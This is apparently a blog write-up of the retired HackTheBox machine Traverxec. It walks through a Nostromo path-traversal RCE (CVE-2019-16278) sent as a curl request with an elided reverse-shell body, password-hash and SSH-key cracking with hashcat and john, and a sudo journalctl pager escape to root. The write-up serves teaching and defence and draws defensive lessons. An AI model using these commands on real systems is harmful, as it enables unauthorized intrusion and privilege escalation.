---
layout: post
title: "The Slash That Walked Backward"
subtitle: "HTB Traverxec, where an obscure web server reads a poisoned path, a forgotten backup hands you the keys, and a log viewer turns into a root shell because nobody shrank the window"
date: 2020-04-18 12:00:00 +0000
description: "An off-brand web server reads an attacker's poisoned path into a command, a backup nobody deleted leaks david's keys, and journalctl's own pager hands over root."
image: /assets/og/the-slash-that-walked-backward.png
tags: [hackthebox, writeup]
---

Traverxec is named after the move that opens it, a traversal that runs code. There is one web server here you have probably never heard of, an old build of Nostromo, and it has a hole where a poisoned path walks backward out of the web root and lands in a shell. From there the box is a tour of things people leave lying around. A password file the server itself reads aloud. A homedir feature that quietly serves david's private folder to the whole internet. A backup of his SSH keys that nobody ever deleted. And at the very end, a log viewer with a pager, where shrinking your terminal window is enough to turn "let me check the logs" into a root prompt. Nothing here is exotic. Every step is somebody trusting input, or trusting a default, or trusting that a convenience would stay private.

```
        T R A V E R X E C
        =================
        GET /.%0d./.%0d./.%0d./bin/sh
              |
              the dots walk backward out of the web root
              |
              v
        nostromo reads your path AS a command and runs it.
        no login. the request was the exploit.

        then: a backup nobody deleted -> david's keys
        then: a log viewer that escapes into a root shell
                                            逆
```

## 0x01 · two doors, one strange

`nmap -sC -sV` comes back almost insultingly short. Two ports, and one of them is the whole story.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1
80/tcp open  http    nostromo 1.9.6
```

SSH is current and boring, so set it aside. The web server is the tell. Most boxes answer port 80 with Apache or nginx, the two names everyone knows. This one answers `nostromo 1.9.6`, and the moment a scan hands you a server you have to go look up, your pulse should pick up. Obscure software gets a fraction of the eyes that the famous stuff gets. Fewer eyes means fewer patches and more old bugs sitting in the open. Think of it like a brand of door lock nobody sells anymore. No locksmith bothered learning its weaknesses, which sounds safe, right up until the one person who did learn them walks up to your door. Nostromo, sometimes called nhttpd, is exactly that lock, and version 1.9.6 has a famous flaw.

## 0x02 · the path that walked backward

The bug is CVE-2019-16278, and it is a path traversal that graduates into remote code execution. Here is the plain version of what went wrong. A web server's first job is to keep you inside the web root, the one folder it is allowed to serve. You ask for `/index.html`, it hands you the file in that folder, and it is supposed to refuse anything with `../` in it, because `../` means "go up a level," and going up enough levels walks you clean out of the web root and into the rest of the machine.

Nostromo did filter `../`. But it forgot a costume. If you write the dots with a carriage return smuggled in the middle, `.%0d./`, the filter does not recognize it as a traversal and lets it through, while the operating system underneath happily reads it as the same old "go up a level." Picture a bouncer with a list of banned names who turns away anyone called Mike. So you walk up and say your name is "M-mike" with a stutter. The bouncer does not find that on his list and waves you in. The kitchen, who actually does the work, hears "Mike" just fine. The check and the thing being checked disagreed about what the path meant, and that gap is the whole exploit.

Walk backward far enough and you reach `/bin/sh`, and Nostromo will run it for you with a POST body as the command. There is a Metasploit module for this, but it is genuinely one HTTP request, so do it by hand with `curl` and watch the seams.

```
$ curl -s -X POST \
    'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' \
    --data '[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]'
```

The dots crawl up out of the web root, the server reaches `/bin/sh`, and the POST body is read not as data but as a command. Start a listener first, and a shell falls into your lap as `www-data`, the low-privilege account the web server runs as.

```
$ nc -lvnp 443
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.165]
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

No password, no second request. The path was the payload.

## 0x03 · the file the server read aloud

`www-data` cannot do much, so look where this particular server keeps its own secrets. Nostromo's config lives under `/var/nostromo/conf`, and two files there matter. The first is `.htpasswd`, the little password file that protects restricted areas, and it is sitting right there for the web user to read.

```
$ cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

That `$1$` prefix marks it as an old md5crypt hash. Feed it to hashcat in mode 500 against the usual wordlist.

```
$ hashcat -m 500 htpasswd /usr/share/wordlists/rockyou.txt --username
david:Nowonly4me
```

The second config file, `nhttpd.conf`, is the more interesting read. It turns on a feature called `homedirs`, where a request to `/~david/` serves files out of david's `public_www` folder. Convenient for a developer who wants a personal page. Also a quiet doorway, because the same setting that publishes his web page also publishes anything else he drops in that tree.

## 0x04 · the backup nobody deleted

So go knocking on david's published folder. Inside `public_www` there is a `protected-file-area`, locked behind exactly the `.htpasswd` credentials we just cracked, and inside that lives the kind of file that should never, ever sit on a web server.

```
$ wget http://david:Nowonly4me@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz
$ tar xzf backup-ssh-identity-files.tgz
home/david/.ssh/id_rsa
home/david/.ssh/authorized_keys
```

A tarball of david's SSH identity. His private key, backed up and published to the web behind one thin password. The key itself is encrypted, which is the one thing done right here, so it asks for a passphrase. Picture a spare house key hidden under the mat, except the key is in a tiny combination lockbox. Better than a bare key, sure. But the lockbox is sitting on the mat in plain view, and the combination is four digits anyone can guess.

The combination here is a wordlist guess. `ssh2john` turns the encrypted key into a hash that john can chew on, then run it against rockyou.

```
$ ssh2john home/david/.ssh/id_rsa > id_rsa.hash
$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
hunter           (home/david/.ssh/id_rsa)
```

The passphrase is `hunter`. Now the key is yours to use. SSH in as david.

```
$ ssh -i home/david/.ssh/id_rsa david@10.10.10.165
Enter passphrase for key 'home/david/.ssh/id_rsa': hunter
david@traverxec:~$ cat user.txt
████████████████████████████████
```

## 0x05 · the log viewer that wasn't

david has a habit worth inspecting. In his home directory sits a `bin` folder with a little helper script, `server-stats.sh`, the kind of thing an admin writes to glance at how the web server is doing. The one line that matters reads like this.

```
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

Read that carefully, because it is the whole privesc. `journalctl` reads the system log, and here it is invoked through `sudo` with no password prompt, which means david is allowed to run the log viewer as root. The script then pipes it through `cat`, which looks harmless, and is. But the danger was never in the pipe. It is in what `journalctl` does on its own.

Here is the thing about programs that show you a lot of text. When the output is longer than your terminal window can hold, many of them quietly hand it off to a pager, the little program that lets you scroll, the one where you press space to page down and `q` to quit. On Linux that pager is almost always `less`. And `less` is not just a viewer. It has a feature, meant as a convenience, where you can type `!` followed by a command and it will run that command for you without leaving the pager.

Now stack the two facts. `journalctl` is running as root, because sudo said so. And `journalctl` will spawn `less` whenever its output does not fit on screen. So `less` inherits root. Think of it like a museum where the night guard lets you peek into the vault through a little window. Harmless, you are just looking. Except the window is big enough to climb through, and the guard is asleep, and once you are inside the vault you can open any door in the building. The pager was supposed to help you read. It will just as happily run anything you ask.

The trick is forcing that pager to appear. The script asks for five lines with `-n5`, so all you do is shrink your terminal until it is shorter than five lines tall. Now the output does not fit, `journalctl` reaches for `less`, and `less` is wearing root's crown. Run the command, and when the pager opens, type the escape.

```
david@traverxec:~$ sudo /usr/bin/journalctl -n5 -unostromo.service
  (terminal shrunk to a few rows, so the pager opens)
!/bin/bash
root@traverxec:/home/david# id
uid=0(root) gid=0(root) groups=0(root)
```

That `!/bin/bash` told the pager to run a shell, and the pager was root, so the shell is root. No exploit binary, no memory corruption. A log viewer and a window the wrong size.

```
root@traverxec:~# cat /root/root.txt
████████████████████████████████
```

## 0x06 · the honest caveat

The Nostromo bug is patched and the CVE has a number, so it is easy to file the front door under "old, fixed, move on." But look at what actually carried you from a low shell to root, because not one step of it was a software vulnerability you could patch.

The password file sat where the web user could read it. The homedirs feature, working exactly as designed, published a folder that turned out to hold a backup of private keys. The key was encrypted with a passphrase short enough to live in a wordlist everyone has. And root fell to a pager doing precisely the thing pagers do, because a sudo rule trusted a program without thinking about every other program that program might launch. That is the part worth losing sleep over. You cannot `apt upgrade` your way out of a backup nobody deleted, or a sudo grant that quietly includes a shell escape.

This is what GTFOBins, the catalog that lists the journalctl trick, is really about. Half the binaries on a normal Linux box can be talked into running a command if you let them run as root. `less`, `vim`, `find`, `awk`, dozens more. The instant you write a sudo rule that lets a user run one of them without a password, you have very likely handed them root, whether you meant to or not. The narrow lesson is patch Nostromo. The wide one is that "let david check the logs as root" and "give david a root shell" turned out to be the same sentence, and nobody read it twice.

## 0x07 · outro

```
the path walked backward and the server ran it.
the backup was still on the shelf, and the keys were inside.
the log viewer opened a window, and the window was a door.

three conveniences, each one left unlocked.
none of them needed an exploit. they needed someone to look.

read the path. delete the backup. shrink the window. wear black.

                                                            EOF
```

---

*HTB: Traverxec, retired 11 April 2020. An easy Linux box that is really a lecture on the things people leave behind, wearing an obscure web server as its costume. The traversal still walks backward in a lab and nowhere you don't own.*